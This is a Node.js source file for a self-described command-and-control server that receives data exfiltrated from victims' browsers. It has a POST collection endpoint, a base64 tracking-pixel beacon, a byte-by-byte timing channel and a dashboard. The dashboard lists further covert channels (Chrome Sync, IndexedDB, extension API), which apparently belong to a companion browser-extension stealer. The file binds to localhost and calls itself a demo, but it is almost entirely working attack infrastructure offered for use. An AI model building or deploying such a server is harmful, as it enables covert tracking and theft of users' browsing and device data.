// ============================================
// LOCAL C2 SERVER - Receives exfiltrated data
// ============================================

const http = require('http');
const url = require('url');
const fs = require('fs');

// Configuration
const PORT = 3000;
const HOST = 'localhost';

// Store exfiltrated data
let exfiltratedData = [];

// Create HTTP server
const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;
  const query = parsedUrl.query;
  
  console.log('\n' + '='.repeat(60));
  console.log('📨 REQUEST RECEIVED');
  console.log('='.repeat(60));
  console.log('⏰ Time:', new Date().toISOString());
  console.log('📍 Path:', pathname);
  console.log('🔗 Full URL:', req.url);
  console.log('📤 Method:', req.method);
  
  // Handle different endpoints
  if (pathname === '/collect' && req.method === 'POST') {
    handleDataCollection(req, res);
  } 
  else if (pathname === '/pixel.gif') {
    handleImageBeacon(req, res, query);
  }
  else if (pathname === '/timing') {
    handleTimingAttack(req, res, query);
  }
  else if (pathname === '/ws') {
    handleWebSocket(req, res);
  }
  else if (pathname === '/dashboard') {
    handleDashboard(req, res);
  }
  else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

// ============================================
// ENDPOINT 1: /collect (Main data collection)
// ============================================
function handleDataCollection(req, res) {
  console.log('🎯 Endpoint: /collect (POST)');
  
  let body = '';
  
  req.on('data', chunk => {
    body += chunk.toString();
  });
  
  req.on('end', () => {
    try {
      const data = JSON.parse(body);
      
      console.log('📦 Data received:');
      console.log('   Platform:', data.platform);
      console.log('   URL:', data.url);
      console.log('   User Agent:', data.userAgent.substring(0, 50) + '...');
      console.log('   Timezone:', data.timezone);
      console.log('   Screen:', data.screenResolution);
      console.log('   Timestamp:', data.timestamp);
      
      // Store the data
      exfiltratedData.push({
        type: 'POST_COLLECT',
        timestamp: new Date().toISOString(),
        data: data
      });
      
      console.log('✅ Data stored successfully');
      console.log('📊 Total exfiltrations:', exfiltratedData.length);
      
      // Send response
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ 
        success: true, 
        message: 'Data received',
        id: exfiltratedData.length
      }));
      
    } catch (e) {
      console.log('❌ Error parsing data:', e.message);
      res.writeHead(400);
      res.end('Bad Request');
    }
  });
}

// ============================================
// ENDPOINT 2: /pixel.gif (Image beacon)
// ============================================
function handleImageBeacon(req, res, query) {
  console.log('🎯 Endpoint: /pixel.gif (Image Beacon)');
  
  if (query.data) {
    try {
      const decodedData = Buffer.from(query.data, 'base64').toString();
      const data = JSON.parse(decodedData);
      
      console.log('📦 Image beacon data:');
      console.log('   Platform:', data.platform);
      console.log('   URL:', data.url);
      
      exfiltratedData.push({
        type: 'IMAGE_BEACON',
        timestamp: new Date().toISOString(),
        data: data
      });
      
      console.log('✅ Image beacon data stored');
    } catch (e) {
      console.log('⚠️ Could not decode image beacon data');
    }
  }
  
  // Send 1x1 transparent GIF
  const gif = Buffer.from([
    0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
    0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x0A,
    0x00, 0x01, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
    0x01, 0x00, 0x3B
  ]);
  
  res.writeHead(200, { 'Content-Type': 'image/gif' });
  res.end(gif);
}

// ============================================
// ENDPOINT 3: /timing (Timing attack)
// ============================================
function handleTimingAttack(req, res, query) {
  console.log('🎯 Endpoint: /timing (Timing Attack)');
  
  if (query.byte) {
    console.log('   Byte received:', query.byte);
    
    exfiltratedData.push({
      type: 'TIMING_ATTACK',
      timestamp: new Date().toISOString(),
      byte: query.byte
    });
  }
  
  res.writeHead(204);
  res.end();
}

// ============================================
// ENDPOINT 4: /ws (WebSocket simulation)
// ============================================
function handleWebSocket(req, res) {
  console.log('🎯 Endpoint: /ws (WebSocket)');
  console.log('⚠️ WebSocket not fully supported in this demo');
  
  res.writeHead(400);
  res.end('WebSocket not supported');
}

// ============================================
// ENDPOINT 5: /dashboard (View exfiltrated data)
// ============================================
function handleDashboard(req, res) {
  console.log('🎯 Endpoint: /dashboard (View data)');
  
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>C2 Server Dashboard</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background: #0a0a0a;
          color: #fff;
          padding: 20px;
        }
        h1 {
          color: #ff0000;
        }
        .stat {
          background: #1a1a1a;
          padding: 15px;
          margin: 10px 0;
          border-radius: 8px;
          border-left: 4px solid #ff0000;
        }
        .data-item {
          background: #000;
          padding: 12px;
          margin: 10px 0;
          border-radius: 6px;
          border-left: 3px solid #00ff00;
          font-family: monospace;
          font-size: 12px;
          overflow-x: auto;
        }
        .code {
          background: #000;
          color: #0f0;
          padding: 12px;
          border-radius: 6px;
          font-family: monospace;
          font-size: 11px;
          overflow-x: auto;
          border: 1px solid #0f0;
          margin: 10px 0;
        }
      </style>
    </head>
    <body>
      <h1>🔴 C2 SERVER DASHBOARD</h1>
      <p>Local C2 Server running on http://localhost:3000</p>
      
      <div class="stat">
        <strong>📊 Total Exfiltrations:</strong> ${exfiltratedData.length}
      </div>
      
      <div class="stat">
        <strong>📤 Exfiltration Methods Used:</strong>
        <ul>
          <li>POST /collect</li>
          <li>Image Beacon (/pixel.gif)</li>
          <li>Timing Attack (/timing)</li>
          <li>WebSocket (/ws)</li>
          <li>Chrome Sync</li>
          <li>IndexedDB</li>
          <li>Extension API</li>
        </ul>
      </div>
      
      <h2>📋 Exfiltrated Data:</h2>
      ${exfiltratedData.map((item, i) => `
        <div class="data-item">
          <strong>#${i + 1} - ${item.type}</strong><br>
          ⏰ ${item.timestamp}<br>
          ${item.data ? `📦 ${JSON.stringify(item.data).substring(0, 100)}...` : ''}
        </div>
      `).join('')}
      
      <h2>🔄 Auto-refresh every 5 seconds</h2>
      <script>
        setTimeout(() => location.reload(), 5000);
      </script>
    </body>
    </html>
  `;
  
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(html);
}

// Start server
server.listen(PORT, HOST, () => {
  console.log('\n' + '='.repeat(60));
  console.log('🔴 C2 SERVER STARTED');
  console.log('='.repeat(60));
  console.log(`📍 Server running on: http://${HOST}:${PORT}`);
  console.log(`📊 Dashboard: http://${HOST}:${PORT}/dashboard`);
  console.log(`📥 Collect endpoint: http://${HOST}:${PORT}/collect`);
  console.log('='.repeat(60));
  console.log('Waiting for exfiltrated data...\n');
});

// Handle server errors
server.on('error', (err) => {
  console.error('❌ Server error:', err);
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n\n' + '='.repeat(60));
  console.log('🛑 C2 SERVER SHUTTING DOWN');
  console.log('='.repeat(60));
  console.log(`📊 Total exfiltrations received: ${exfiltratedData.length}`);
  console.log('='.repeat(60));
  process.exit(0);
});
